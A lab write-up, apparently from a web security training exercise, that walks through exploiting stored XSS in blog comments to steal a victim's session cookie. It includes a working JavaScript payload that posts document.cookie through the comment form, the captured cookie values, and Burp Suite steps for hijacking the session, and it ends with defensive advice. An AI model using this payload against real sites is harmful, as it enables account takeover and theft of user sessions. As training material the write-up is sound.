#  Lab: Exploiting Cross-Site Scripting to Steal Cookies

## Overview

This lab involves a stored XSS vulnerability within the blog comments section. When a victim user views the comments, their session cookie can be exfiltrated. The objective is to leverage this vulnerability to steal the victim's session cookie and use it to impersonate them.

---

## Exploitation Process

### 1. Identifying the XSS Vulnerability

The blog comments functionality was found to be vulnerable to stored XSS. Any injected script gets executed when a victim visits the comments section, making it an ideal target for session hijacking.

### 2. Exploiting CSRF Token to Extract Session Cookies

A crafted JavaScript payload was injected into the comment field to retrieve the CSRF token and session cookies. The script then sends the extracted cookies to an attacker-controlled location via a POST request.

#### **Payload:**

```javascript
window.addEventListener('DOMContentLoaded', function() {
    var token = document.getElementsByName('csrf')[0].value;
    var data = new FormData();

    data.append('csrf', token);
    data.append('postId', 5);
    data.append('comment', document.cookie);
    data.append('name', 'victim');
    data.append('email', 'dmind1077@gmail.com');
    data.append('website', 'https://google.com');

    fetch('/post/comment', {
        method: 'POST',
        mode: 'no-cors',
        body: data
    });
});
```

Once executed, this script extracts the user's session cookie and submits it to the attacker's controlled request.

### 3. Extracted Session Cookie

Upon execution of the script, the following session cookie was obtained:

```
secret=19fwNupHBBVBZrkozoRbOLZgYmf2A709;
session=otzMpyhwD8VvexWnGw73WriSUk4NQMHI
```

### 4. Using Burp Suite to Hijack the Session

- The captured session cookie was used to impersonate the victim.
- In **Burp Suite**, we navigated to **Target > /my-account**.
- The request was sent to **Repeater**, and the stolen cookie was manually injected into the session.
- The request was successfully authenticated as the victim, confirming session hijacking.

---

## Conclusion

By leveraging stored XSS and CSRF token exploitation, we successfully hijacked the victim's session. This demonstrates the impact of unprotected input fields and poor session handling. Proper input validation, output encoding, and secure cookie handling (e.g., HttpOnly and SameSite attributes) are necessary to prevent such attacks.